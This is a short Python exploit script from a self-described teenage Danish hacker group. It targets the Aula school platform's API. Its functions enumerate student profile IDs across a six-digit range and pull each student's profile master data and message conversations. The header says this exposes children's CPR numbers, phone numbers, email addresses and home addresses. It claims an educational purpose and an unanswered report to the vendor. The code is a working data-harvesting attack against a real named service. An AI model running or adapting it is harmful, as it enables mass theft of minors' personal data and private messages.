"""
  ____  _                              _       _     
 |  _ \(_)                            | |     | |    
 | |_) |_ _ __   __ _ _ __ _   _   ___| |_   _| |__  
 |  _ <| | '_ \ / _` | '__| | | | / __| | | | | '_ \ 
 | |_) | | | | | (_| | |  | |_| || (__| | |_| | |_) |
 |____/|_|_| |_|\__,_|_|   \__, (_)___|_|\__,_|_.__/ 
                            __/ |                    
                           |___/                      
~ Binary club
We are publishing this code for educational purposes only and to circumvent Kombit A/S Breaking multiple-laws, GDPR and other privacy regulations.
We are not responsible for any misuse of this code.
This Issue has been reported to the Kombit A/S team but no response has been received, Therefor we demand that you do not use this code for any illegal purposes.
Exposing Children SSN Numbers: (Social Security Number) or Better known as CPR numbers in Denmark.
Exposing Phone Numbers
Exposing Email Addresses
Exposing Home Addresses
______________________________________________________________________________________________________________
Project by Wrec & H4xton ~ The Binary.club team is a collective of Danish researches and hackers aged between 15-18 Years old. 
"""

import requests


class Aula:

    def ReceiveStudenInformation(StudentID):
      
        """ Get all information about the student. """

        res = requests.get(f"https://www.aula.dk/api/v12/?method=profiles.getProfileMasterData&instProfileIds[]={StudentID}&fromAdministration=false")

        print(res.text)


    def ScrapeAula():
      
        """ Scrapes all ID's between 100000 ... 999999, for possible students. """

        for StudentID in range(100000, 999999):

            res = requests.get(f"https://www.aula.dk/api/v12/?method=profiles.getProfileMasterData&instProfileIds[]={StudentID}&fromAdministration=true")

            if res.status_code == 200:
                print(f"{StudentID} ~ Is a valid ID and is being used by a student")

            else:
                print(f"{StudentID} ~ Is not a valid ID")


    def ScrapeMessages(StudentID):
      
        """ Get all conversations by student. """
      
        res = requests.get(f"https://www.aula.dk/api/v12/?method=messages.getMessages&instProfileIds[]={StudentID}&fromAdministration=false")

        print(res.text)
